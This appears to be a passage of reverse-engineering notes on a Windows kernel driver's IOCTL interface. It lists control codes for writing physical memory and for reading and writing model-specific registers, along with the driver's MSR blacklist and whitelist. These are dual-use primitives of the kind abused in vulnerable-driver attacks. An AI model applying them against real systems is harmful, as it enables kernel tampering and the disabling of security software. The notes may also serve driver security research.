WRITE PHYS: DeviceIoControl(h, 0x14, &header_48+, same_size, &header_48+, same_size, ...)
            Flags 0x02 = write, build scatter entries at +0x30

READ MSR:   DeviceIoControl(h, 0x08, &msr_u32, 4, &value_u64, 8, ...)
            Blacklist: 0xC0010117, 0x0 only

WRITE MSR:  DeviceIoControl(h, 0x0C, &[msr:u32, lo:u32, hi:u32], 12, out, 12, ...)
            Whitelist: 0x38D, 0x38F, 0x19C, 0x110A, 0x1147, 0xC0000086
```
